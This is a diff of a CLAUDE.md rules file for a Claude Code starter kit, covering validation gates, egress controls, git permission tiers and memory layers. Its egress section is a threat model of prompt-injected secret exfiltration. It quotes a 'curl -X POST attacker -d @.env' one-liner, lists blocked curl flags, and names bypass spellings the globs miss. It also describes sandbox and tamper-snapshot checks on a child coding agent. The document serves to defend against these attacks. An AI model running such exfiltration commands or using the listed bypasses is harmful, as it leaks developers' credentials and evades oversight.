@@ -2,7 +2,7 @@
 
 This file provides guidance to Claude Code (claude.ai/code) when working with this project.
 
-> **Starter kit note:** seed file — run `/harness:create-rules` after cloning. `{placeholder}` sections are yours to fill; the rest is the shared baseline.
+> **Starter kit note:** seed file — run `/setup:create-CLAUDE_MD` after cloning. `{placeholder}` sections are yours to fill; the rest is the shared baseline.
 
 ---
 
@@ -16,7 +16,7 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 | Context | Language |
 |---------|----------|
-| Claude ↔ developer communication | **Polish** — always (set at bootstrap by `/harness:setup-start`) |
+| Claude ↔ developer communication | **Polish** — always (set at bootstrap by `/setup:create-CLAUDE_MD`) |
 | Code, comments, docstrings, commit messages, technical docs | **English** — always |
 | App UI, user-facing messages, error messages | **As defined in PRD** (default: Polish) — check `docs/PRD.md` or ask if unclear |
 
@@ -42,14 +42,14 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 ## Validation
 
-> **Source of truth for quality gates.** `/harness:gates-verify-implementation` and `/orchestrate` read this section and run these commands in sequence (fail fast). Filled per-project by `/harness:create-rules`. Until filled, gates fall back to stack-detected defaults.
+> **Source of truth for quality gates.** `/gates:verify-implementation` and `/orchestrate` read this section and run these commands in sequence (fail fast). Filled per-project by `/setup:create-CLAUDE_MD`. Until filled, gates fall back to stack-detected defaults.
 
 ```bash
 # Run in order, stop on first failure
 {typecheck-command} && {lint-command} && {test-command}
 ```
 
-**Runtime smoke — optional fourth, conditional step.** The commands above never render a frame. When a change touches `{ui-paths}` **and** an app is running, the gate also performs the baseline → reload → diff check the harness reference `runtime-smoke.md` describes. No running app or device → `SKIPPED` with the reason (never `FAIL`, never a silent pass). Delete this paragraph in a project with no rendered UI.
+**Runtime smoke — optional fourth, conditional step.** The commands above never render a frame. When a change touches `{ui-paths}` **and** an app is running, the gate also performs the baseline → reload → diff check in [.agents/reference/runtime-smoke.md](.agents/reference/runtime-smoke.md). No running app or device → `SKIPPED` with the reason (never `FAIL`, never a silent pass). Delete this paragraph in a project with no rendered UI.
 
 **Test policy — which layers MUST have tests:**
 
@@ -87,7 +87,7 @@ Generic defaults — tune per project: files max **500 lines** · functions max 
 
 **Comments: why, not what — cap 1-2 lines.** A comment that restates the adjacent statement, echoes a variable / constant / function name, or repeats what the signature already says is **noise, and gets deleted**. Keep only a *why* the code cannot express: a vendor quirk, a rejected alternative, a non-obvious invariant, or a workaround with a ticket reference. Longer reasoning belongs in `.agents/memory/` or the spec, with a one-line pointer from the code.
 
-> This rule is **enforced at three altitudes**, so it is not advice: `guard-comments.sh` nudges at write time (dormant until [.claude/comment-guard.json](.claude/comment-guard.json) is configured), `/deep-review` standard 8 **deletes** noise with write authority, and `/harness:gates-verify-implementation` warns on it. All three point back at this section by name — keep the heading and the rule together.
+> This rule is **enforced at three altitudes**, so it is not advice: `guard-comments.sh` nudges at write time (dormant until [.claude/comment-guard.json](.claude/comment-guard.json) is configured), `/deep-review` standard 8 **deletes** noise with write authority, and `/gates:verify-implementation` warns on it. All three point back at this section by name — keep the heading and the rule together.
 
 ---
 
@@ -105,29 +105,27 @@ Specific exceptions only — no bare `except` / generic catch · per-module logg
 
 **Egress policy — the AI can read a secret, so the guard is on sending it.** The file-write denies in [.claude/settings.json](.claude/settings.json) stop the agent *writing* `.env`, keys and PEMs; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:
 
-- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/harness:create-rules` appends stack-specific ones. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
+- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends stack-specific ones. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
 - **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.
 
 > **Honest limit:** these are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.
 
 **Recorded exception: `pr-api.sh`.** [.claude/skills/pr-comments/references/pr-api.sh](.claude/skills/pr-comments/references/pr-api.sh) is allow-listed whole in `settings.json` — its `reply` subcommand runs `curl -X POST … -d @body` *inside* the script, where no deny glob can see it (permissions match the Bash command string, not subprocesses). This bypasses the egress denies by design. Mitigations: it is the **only** script with that allowance; it posts solely after a per-thread human `y` inside `/pr-comments` (HARD-GATE 1); and credentials travel only as request headers to the host derived from `origin`, never in a URL or on stdout. Do not add a second script to that allowance without recording it here.
 
-**Recorded allowance: harness plugin scripts (machine-local).** Plugin skills run `node <installed root>/scripts/*.mjs`. The allow rule for that lives in the gitignored `.claude/settings.local.json` as the absolute, version-agnostic cache directory (`Bash(node /Users/<you>/.claude/plugins/cache/ai-coding-starter/harness/*)`), written by `/harness:setup-start` with consent. It is deliberately **not** a portable glob in `settings.json`: with `Write` allowed, a rule like `Bash(node */…/harness/*)` would also run a file the agent wrote under a matching path. The shared guard is the other way round — `settings.json` denies `Write`/`Edit` under `~/.claude/plugins/**`, so the cache holds only what the marketplace installed.
-
-**Recorded allowance: plugin executor.** The Codex executor (`/execute codex`, `/check-implementation codex`, the cross-model reviews) runs as `node <installed root>/scripts/executor-orchestrator.mjs` under the machine-local plugin-script allowance above. The supervisor itself writes only bookkeeping — the run directory under the session scratchpad passed as `--scratch` and a lock file under the repository's git dir. **The child it starts in write mode has workspace-write authority over the repository** (`--sandbox workspace-write`, shell enabled); that authority is bounded after the fact, not prevented: the run-relative snapshot compares selected git metadata (HEAD, branch, stash, refs, index, config), every tracked and untracked non-ignored path, the secret-looking subset of ignored files and the declared `--scope`, and the calling skill stops on any deviation or out-of-scope path. It does not enumerate arbitrary `.git/` contents and does not hash ordinary ignored build output; writes under `.git/` are the sandbox's job, not the snapshot's. Read mode runs the child under `--sandbox read-only` and rejects the opinion if the tree changed anyway. Network egress is disabled on the child by the adapter's feature flags (`web_search`, browser and app surfaces), which is configuration, not a boundary — the same honest-limit caveat as the curl globs above. The legacy baseline-script allowance was removed together with that script in harness 0.3.0.
+**Recorded allowance: `git-baseline.sh`.** `Bash(bash .claude/lib/git-baseline.sh:*)` is allow-listed so the mandatory post-Codex tamper check in `/execute codex` / `/check-implementation codex` runs without mid-pipeline prompts. Unlike `pr-api.sh` it performs **no egress** — it only writes fixed snapshot filenames (`meta.txt`, `ignored.z`, `ignored.txt`, `sensitive.sha`, `after/*`) under the directory the caller passes, which is a narrow local-write channel that skips the usual write prompt. Point it only at the session scratchpad; widening it to other scripts needs a note here.
 
 ---
 
 ## Git Workflow
 
-- **Commits · sync · releases:** `/harness:commit` (conventional commits), `/harness:push` / `/harness:pull` (they resolve the current branch), `/harness:release` (bumps the detected manifest, CHANGELOG, tag).
+- **Commits · sync · releases:** [/commit](.claude/commands/commit.md) (conventional commits), [/push](.claude/commands/push.md) / [/pull](.claude/commands/pull.md) (they resolve the current branch), [/release](.claude/commands/release.md) (bumps the detected manifest, CHANGELOG, tag).
 - **AI git policy — three permission tiers** in [.claude/settings.json](.claude/settings.json), the source of truth for which command sits where. Precedence `deny` > `ask` > `allow`: `deny` is absolute — no prompt or classifier overrides it; `ask` always prompts, even in auto mode; anything in no list (bare `git merge`, soft/mixed `git reset`) prompts interactively.
-- **`git worktree remove --force` can discard uncommitted work.** Its only guard is `/harness:orchestrate`'s `status --porcelain` check (Step 5.5 and Phase 7), which force-removes a worktree only when it is clean and fully merged.
+- **`git worktree remove --force` can discard uncommitted work.** Its only guard is [/orchestrate](.claude/commands/orchestrate.md)'s `status --porcelain` check (Step 5.5 and Phase 7), which force-removes a worktree only when it is clean and fully merged.
 - **`git worktree` and `git merge --ff-only` are reserved for the `/orchestrate` pipeline.** They are allow-listed in `settings.json` only so the pipeline runs without per-step prompts; an allow cannot be scoped to one command, so this is a behavioral rule, not a hard gate. Do not use either ad hoc in a normal session.
-- **A new branch must not track a protected branch.** `git switch -c` / `checkout -b` from `origin/<protected>` auto-sets that branch as upstream, so a bare `git push` targets it directly. Create with `--no-track` (or run `git branch --unset-upstream` right after) and let `/harness:push` set the upstream on first push.
-- **Protected branches refuse commits and pipeline runs** — `/harness:commit` and `/harness:orchestrate` Phase 4 read **Protected** from the Branch model block below. Block absent or field empty → no branch is protected and both proceed (the starter's own default is committing on `main`).
-- **`/harness:orchestrate` pushes the current branch**, not a hardcoded `main`; parallel runs and the supervised `--integrate` merge queue: the harness reference `parallel-orchestration.md`.
-- **AI attribution in commits is switched off in `settings.json`** (`"attribution": { "commit": "", "pr": "", "sessionUrl": false }`), not forbidden by prose: by default the host injects a session-level instruction to append `Co-Authored-By` and `Claude-Session` trailers that outranks any rule file, and a prose rule the model can be overruled on is worse than none. The older `includeCoAuthoredBy` is deprecated and silences only the first trailer. Keep the key; do not re-add the prohibition to `/commit`.
+- **A new branch must not track a protected branch.** `git switch -c` / `checkout -b` from `origin/<protected>` auto-sets that branch as upstream, so a bare `git push` targets it directly. Create with `--no-track` (or run `git branch --unset-upstream` right after) and let [/push](.claude/commands/push.md) set the upstream on first push.
+- **Protected branches refuse commits and pipeline runs** — [/commit](.claude/commands/commit.md) and [/orchestrate](.claude/commands/orchestrate.md) Phase 4 read **Protected** from the Branch model block below. Block absent or field empty → no branch is protected and both proceed (the starter's own default is committing on `main`).
+- **[/orchestrate](.claude/commands/orchestrate.md) pushes the current branch**, not a hardcoded `main`; parallel runs and the supervised `--integrate` merge queue: [.agents/reference/parallel-orchestration.md](.agents/reference/parallel-orchestration.md).
+- **Never include AI attribution** in commit messages unless explicitly requested. Enforced by the `attribution` key in [.claude/settings.json](.claude/settings.json) (`"commit": "", "pr": "", "sessionUrl": false`) — the host injects a session instruction that outranks any rule file, so the setting is what actually switches it off; keep the key.
 
 **Orchestrate publish:** push
 
@@ -135,7 +133,7 @@ Specific exceptions only — no bare `except` / generic catch · per-module logg
 
 ### Branch model
 
-> _Filled in by `/harness:create-rules` at project bootstrap._ The single source of branch facts — any command or session that needs one (where to base work, where a PR lands, which branches are protected) reads it here instead of embedding its own guess. Fields: **Preset** · **Trunk** · **Integration** · **Branch names** · **Base → PR dest** · **Protected**, plus **Merge** only when the project deviates from its preset. Block absent → resolve `git symbolic-ref refs/remotes/origin/HEAD`, then `main`, then `master`; **never assume `develop`**. `**Merge:**` absent → squash for working types, merge commit for `release`/`hotfix`.
+> _Filled in by `/setup:create-CLAUDE_MD` at project bootstrap._ The single source of branch facts — any command or session that needs one (where to base work, where a PR lands, which branches are protected) reads it here instead of embedding its own guess. Fields: **Preset** · **Trunk** · **Integration** · **Branch names** · **Base → PR dest** · **Protected**, plus **Merge** only when the project deviates from its preset. Block absent → resolve `git symbolic-ref refs/remotes/origin/HEAD`, then `main`, then `master`; **never assume `develop`**. `**Merge:**` absent → squash for working types, merge commit for `release`/`hotfix`.
 
 ---
 
@@ -146,7 +144,7 @@ Knowledge layers under `.agents/`. **Before any task read [.agents/memory/index.
 | Layer | Contains | Lifecycle | Written by |
 |-------|----------|-----------|------------|
 | [sources/](.agents/sources/) | Raw input — briefs, transcripts, sketches, PDFs | Immutable, pruned manually | Human only |
-| [memory/](.agents/memory/) | Lessons, decisions, quirks, patterns, architecture map, brief | Append-only (newest at end) · some regenerated | reflection pass, `/harness:refresh-brief`, `/harness:create-rules` |
+| [memory/](.agents/memory/) | Lessons, decisions, quirks, patterns, architecture map, brief | Append-only (newest at end) · some regenerated | reflection pass, `/maintain:refresh-brief`, `/setup:create-CLAUDE_MD` |
 | [reference/](.agents/reference/) | Stable reference docs — APIs, cheatsheets, domain facts | Long-lived | Human + AI |
 | `backlog.md` *(optional)* | Delivery map — epics, task DAG, work packages | `Status`/`Ref` written back by the pipeline | `/setup:create-backlog` · `/plan-feature` · `/orchestrate` |
 | [specs/](.agents/specs/) | Design docs — what to build and why | Lives with the feature | `/brainstorm` |
@@ -165,7 +163,7 @@ Generic triggers, always on. **Project-specific routing** lives in [.agents/memo
 - **Before implementing something new:** check `.agents/plans/active/` for existing plans
 - **Before editing code (enforced by `guard-memory.sh`):** the first code edit per memory domain is blocked once a session — delegate a `general-purpose` subagent to distill the relevant `errors.md` / `patterns.md` / `decisions.md` entries, then `touch` the marker the hook prints. Dormant until [.claude/memory-domains.json](.claude/memory-domains.json) has path→domain rules **and** memory outgrows its size threshold (both required).
 - **When uncertain about approach:** make routine judgment calls yourself; stop and ask when different readings of the request would lead to materially different work
-- **After a `/qa-verify` run with interaction rows** (Playwright methods, or a Tier-2 driver run): offer to promote the recorded sequence into a regression test per the harness reference `qa-to-regression-test.md` — QA never writes tests itself, so the sequence is lost otherwise
+- **After a `/qa-verify` run with interaction rows** (Playwright methods, or a Tier-2 driver run): offer to promote the recorded sequence into a regression test per [.agents/reference/qa-to-regression-test.md](.agents/reference/qa-to-regression-test.md) — QA never writes tests itself, so the sequence is lost otherwise
 - **After fixing a bug:** route the lesson per [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md) → target table — a defect in application code → `errors.md` (it must name the source file); friction in a slash command, hook, MCP server or shell/git invocation → `domain/harness.md`. Ask *"Would a fresh Claude make this mistake again without it?"* — the default is to write nothing.
 - **When a `domain/` memory file doesn't exist but is needed:** create it from the template in [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md)
 - **When writing to memory at the end of a run:** read [.agents/memory/reflection-protocol.md](.agents/memory/reflection-protocol.md) first — the save-or-not bar and entry formats live there, outside the `/prime` payload
